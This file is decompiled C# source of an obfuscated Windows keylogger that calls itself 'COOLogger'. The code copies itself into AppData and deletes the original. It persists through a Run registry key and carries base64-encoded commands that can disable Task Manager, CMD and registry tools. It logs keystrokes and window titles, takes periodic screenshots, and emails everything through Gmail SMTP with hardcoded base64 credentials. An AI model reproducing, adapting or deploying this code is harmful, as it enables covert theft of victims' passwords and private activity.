using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class NEdslVDFaDHVfzO
{
	private static string BnOkjMtLwBaBMGY = "eW91cmVob3RzZXgyMUBnbWFpbC5jb20=";

	private static string VrOmeamESnbkIDg = "ODcybmRnNzIzOGoyMzQx";

	private static string iPjowmSbbZeCJQu = "smtp.gmail.com";

	private static int HHWadVtJClTWqTX = 587;

	private static string BaphSzCWyEScwKx;

	private static string kLhgJpHtxXxJDVS;

	private static string oLjbXjzPkYhFzdf;

	private static string MgltiOXYWbyGNqE;

	private static string DTXaRqGxiQSnQUi;

	private static string dSxHIGLvowanmDH;

	private static int RcWoYuepurDUiqr = 600000;

	private static string xUhvctgkKxvpIFb = null;

	private static string GKNEdslVDFaDHVf = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string zOBnOkjMtLwBaBM = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string GYVrOmeamESnbkI = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object lhReEEfnzcvbyRq = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string BZTwyflFNDidech = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage SZgwXXndfXwZECj = new MailMessage();

	private static SmtpClient pUFBoKzqFPxxkXx = new SmtpClient();

	[AccessedThroughProperty("RCwlGwnBMuthTuR")]
	private static UhvctgkKxvpIFbx _RCwlGwnBMuthTuR;

	private static object VgjyUVeojNcvPid = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox NpUFBoKzqFPxxkX = new RichTextBox();

	private static UhvctgkKxvpIFbx RCwlGwnBMuthTuR
	{
		get
		{
			return _RCwlGwnBMuthTuR;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_RCwlGwnBMuthTuR != null)
			{
				UhvctgkKxvpIFbx.KeyDown -= KNEdslVDFaDHVfz;
			}
			_RCwlGwnBMuthTuR = value;
			if (_RCwlGwnBMuthTuR != null)
			{
				UhvctgkKxvpIFbx.KeyDown += KNEdslVDFaDHVfz;
			}
		}
	} = new UhvctgkKxvpIFbx();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		dSxHIGLvowanmDH = Conversions.ToString(true);
		oLjbXjzPkYhFzdf = Conversions.ToString(false);
		MgltiOXYWbyGNqE = Conversions.ToString(false);
		DTXaRqGxiQSnQUi = Conversions.ToString(false);
		kLhgJpHtxXxJDVS = Conversions.ToString(true);
		BaphSzCWyEScwKx = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, lhReEEfnzcvbyRq, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(lhReEEfnzcvbyRq, (object)"\\WdtUUjZcUsWBygV.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(BZTwyflFNDidech + "\\WdtUUjZcUsWBygV.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(lhReEEfnzcvbyRq, (object)"\\"), VgjyUVeojNcvPid))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(lhReEEfnzcvbyRq, (object)"\\"), VgjyUVeojNcvPid)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(lhReEEfnzcvbyRq, (object)"\\"), VgjyUVeojNcvPid)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(lhReEEfnzcvbyRq, (object)"\\"), VgjyUVeojNcvPid)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(lhReEEfnzcvbyRq, (object)"\\"), VgjyUVeojNcvPid) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(BaphSzCWyEScwKx))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(VgjyUVeojNcvPid)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(VgjyUVeojNcvPid), Operators.ConcatenateObject(Operators.ConcatenateObject(lhReEEfnzcvbyRq, (object)"\\"), VgjyUVeojNcvPid));
			}
		}
		if (Conversions.ToBoolean(kLhgJpHtxXxJDVS))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(lhReEEfnzcvbyRq, (object)"\\WdtUUjZcUsWBygV.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(oLjbXjzPkYhFzdf))
		{
			Interaction.Shell(OBnOkjMtLwBaBMG(GKNEdslVDFaDHVf), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(MgltiOXYWbyGNqE))
		{
			Interaction.Shell(OBnOkjMtLwBaBMG(zOBnOkjMtLwBaBM), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(DTXaRqGxiQSnQUi))
		{
			Interaction.Shell(OBnOkjMtLwBaBMG(GYVrOmeamESnbkI), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(600000);
		val.add_Tick((EventHandler)drZqcgHusmFCYuT_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)YVgjyUVeojNcvPi_Ticked);
		val2.Start();
		RCwlGwnBMuthTuR.WcYjmCXYirmQfyT();
		Application.Run();
	}

	private static string iEFOmTwMsySaQvq()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string OBnOkjMtLwBaBMG(string uHHWadVtJClTWqT)
	{
		byte[] bytes = Convert.FromBase64String(uHHWadVtJClTWqT);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void drZqcgHusmFCYuT_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(dSxHIGLvowanmDH))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = TlgVCKLJOyszdqp(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(lhReEEfnzcvbyRq, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(lhReEEfnzcvbyRq, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(OBnOkjMtLwBaBMG(BnOkjMtLwBaBMGY));
				mailMessage.To.Add(OBnOkjMtLwBaBMG(BnOkjMtLwBaBMGY));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = NpUFBoKzqFPxxkX.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(OBnOkjMtLwBaBMG(BnOkjMtLwBaBMGY), OBnOkjMtLwBaBMG(VrOmeamESnbkIDg));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				NpUFBoKzqFPxxkX.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage sZgwXXndfXwZECj = SZgwXXndfXwZECj;
		sZgwXXndfXwZECj.From = new MailAddress(OBnOkjMtLwBaBMG(BnOkjMtLwBaBMGY));
		sZgwXXndfXwZECj.To.Add(OBnOkjMtLwBaBMG(BnOkjMtLwBaBMGY));
		sZgwXXndfXwZECj.Subject = "COOLogger Logs from - " + Environment.UserName;
		sZgwXXndfXwZECj.Body = NpUFBoKzqFPxxkX.get_Text();
		sZgwXXndfXwZECj = null;
		SmtpClient smtpClient2 = pUFBoKzqFPxxkXx;
		smtpClient2.Host = "smtp.gmail.com";
		smtpClient2.Port = 587;
		smtpClient2.EnableSsl = true;
		smtpClient2.Credentials = new NetworkCredential(OBnOkjMtLwBaBMG(BnOkjMtLwBaBMGY), OBnOkjMtLwBaBMG(VrOmeamESnbkIDg));
		smtpClient2.Send(SZgwXXndfXwZECj);
		smtpClient2 = null;
		NpUFBoKzqFPxxkX.set_Text("");
	}

	public static void KNEdslVDFaDHVfz(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox npUFBoKzqFPxxkX = NpUFBoKzqFPxxkX;
		npUFBoKzqFPxxkX.set_Text(npUFBoKzqFPxxkX.get_Text() + RCwlGwnBMuthTuR.lgVCKLJOyszdqpG(e));
	}

	public static void YVgjyUVeojNcvPi_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(xUhvctgkKxvpIFb, iEFOmTwMsySaQvq(), false) != 0)
		{
			xUhvctgkKxvpIFb = iEFOmTwMsySaQvq();
			if (Operators.CompareString(xUhvctgkKxvpIFb, "", false) != 0)
			{
				RichTextBox npUFBoKzqFPxxkX = NpUFBoKzqFPxxkX;
				npUFBoKzqFPxxkX.set_Text(npUFBoKzqFPxxkX.get_Text() + "\r\n\r\n~~~~~" + xUhvctgkKxvpIFb + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string TlgVCKLJOyszdqp(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
